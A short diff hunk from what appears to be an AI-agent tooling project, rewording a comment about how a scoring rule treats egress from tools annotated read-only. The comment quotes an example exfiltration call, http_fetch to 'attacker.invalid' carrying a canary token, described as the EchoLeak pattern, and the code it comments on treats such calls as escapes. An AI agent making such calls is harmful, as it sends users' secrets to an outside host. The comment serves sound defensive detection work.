@@ -329,7 +329,7 @@ def read_only_tools() -> frozenset[str]:
 #
 # `http_fetch` and `http_search` are annotated read-only (`agent_mcp/annotations.py:82`),
 # so the sink rule above scores `http_fetch(url="http://attacker.invalid/?d=<CANARY>")` —
-# the exact shape `agent_mcp/egress.py:10` names as #590's EchoLeak exfiltration — as a
+# the exact shape `agent_mcp/egress.py`'s own module docstring names as #590's EchoLeak exfiltration — as a
 # benign echo, forever. This arm books it: an egress lane that carries the token to a
 # host policy does not name is an escape whatever its annotation says.
 
